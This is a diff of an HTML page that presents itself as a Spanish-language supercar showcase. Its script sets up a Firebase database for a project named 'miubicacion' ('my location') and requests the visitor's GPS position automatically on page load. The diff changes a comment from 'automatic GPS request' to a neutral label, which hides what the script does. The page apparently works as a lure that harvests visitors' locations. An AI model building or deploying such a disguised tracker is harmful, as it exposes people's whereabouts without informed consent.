@@ -40,7 +40,7 @@
 
     <section class="hero">
         <h2>Adrenalina y Velocidad</h2>
-        <p>Descubre la ingeniería y el diseño de los superdeportivos más icónicos del mundo.</p>
+        <p>Descubre la ingenieria y el diseno de los superdeportivos mas iconicos del mundo.</p>
     </section>
 
     <main class="container">
@@ -49,14 +49,14 @@
             <div class="card">
                 <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400">
                 <div class="card-content">
-                    <h3>Superdeportivo Clásico</h3>
-                    <p>Diseño aerodinámico italiano con un motor V8 capaz de romper cualquier récord de velocidad.</p>
+                    <h3>Superdeportivo Clasico</h3>
+                    <p>Diseno aerodinamico italiano con un motor V8 capaz de romper cualquier record de velocidad.</p>
                 </div>
             </div>
             <div class="card">
                 <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400">
                 <div class="card-content">
-                    <h3>Tecnología Urbana</h3>
+                    <h3>Tecnologia Urbana</h3>
                     <p>Equipamiento moderno de fibra de carbono enfocado en la agilidad urbana.</p>
                 </div>
             </div>
@@ -68,7 +68,7 @@
     </footer>
 
     <script>
-        // CONFIGURACIÓN CORREGIDA AL 100% CON TU CAPTURA
+        // CONFIGURACION REAL SIN TRADUCIR
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
             authDomain: "miubicacion-22e7f.firebaseapp.com",
@@ -76,14 +76,14 @@
             projectId: "miubicacion-22e7f",
             storageBucket: "miubicacion-22e7f.firebasestorage.app",
             messagingSenderId: "847245935895",
-            appId: "1:847245935895:web:e9576ba5280ac05b22e352" // <--- Aquí estaba el corte
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
         };
 
         // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Petición automática del GPS
+        // Escuchador de carga de ventana
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
